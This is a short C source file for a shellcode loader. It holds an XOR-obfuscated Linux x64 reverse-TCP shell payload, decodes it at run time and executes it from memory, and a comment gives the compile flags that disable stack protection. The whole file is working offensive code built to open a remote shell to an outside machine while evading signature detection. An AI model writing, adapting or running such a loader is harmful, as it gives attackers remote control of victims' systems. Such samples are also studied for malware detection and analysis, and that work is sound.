#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// To compile:
// gcc -o simpleLoader simpleLoader.c -z execstack

// XOR-encoded 'linux/x64/shell_reverse_tcp' payload (key: 0xfa)
unsigned char buf[] = "\x90\xD3\xA2\x63\x90\xF8\xA5\x90\xFB\xA4\xF5\xFF\xB2\x6D\xB2\x43\xF8\xFA\xFA\xAA\x3A\x52\xCB\xB9\xAB\xB2\x73\x1C\x90\xEA\xA0\x90\xD0\xA2\xF5\xFF\x90\xF9\xA4\xB2\x05\x34\x90\xDB\xA2\xF5\xFF\x8F\x0C\x90\xC1\xA2\x63\xB2\x41\xD5\x98\x93\x94\xD5\x89\x92\xFA\xA9\xB2\x73\x1D\xA8\xAD\xB2\x73\x1C\xF5\xFF\xFA";

int main (int argc, char **argv)
{
        int key = 250;
        int buf_len = (int) sizeof(buf);

        // Decode the payload
        for (int i=0; i<buf_len; i++)
        {
                buf[i] = buf[i] ^ key;
        }

        // Cast the shellcode to a function pointer and execute
        int (*ret)() = (int(*)())buf;
        ret();
}